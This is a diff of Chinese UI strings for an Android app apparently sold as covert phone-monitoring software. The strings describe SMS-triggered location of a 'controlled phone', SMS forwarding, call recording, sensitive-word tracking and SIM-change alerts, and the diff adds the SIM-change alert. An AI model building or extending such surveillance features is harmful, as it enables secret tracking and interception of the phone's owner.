@@ -95,7 +95,6 @@
     <string name="pref_sensitive_words_count_reach_max">最多只能支持%d个敏感词，多余的将被忽略。请您重新编辑敏感词。</string>
 	<string name="pref_gps_word_title">激活词（或短句）</string>
     <string name="pref_gps_word_summary">发送短信#dw到被控手机可获知其位置（仅从主控手机上发送有效）。</string>
-    <string name="pref_pls_input_gps_activate_word">请输入一个特殊词或短句作为GPS激活词（比如：你在哪儿）。</string>
     <string name="pref_gps_activate_word_max_len">最大长度不能超过12个汉字或24个英数字符。</string>
     <string name="pref_category_network_mode_title">网络连接</string>
     <string name="pref_network_mode_title">网络连接模式</string>
@@ -146,6 +145,7 @@
     <string name="msg_expired_alert">安卓监控提醒您：在本机上的试用期已过，如需继续使用请联系客服QQ:602592749。</string>
     <string name="msg_sms_times_over_in_trial">安卓监控提醒您：试用期转发短信已经达到10条，如需继续使用请联系客服QQ:602592749。</string>
     <string name="msg_recording_times_over_in_trial">安卓监控提醒您：试用期通话录音已经达到5次，如需继续使用请联系客服QQ:602592749。</string>
+    <string name="msg_changed_sim">安卓监控提醒您：%s更换了手机SIM卡。</string>
     
     <!-- Indication -->
     <string name="indication_register_ok">注册成功。</string>
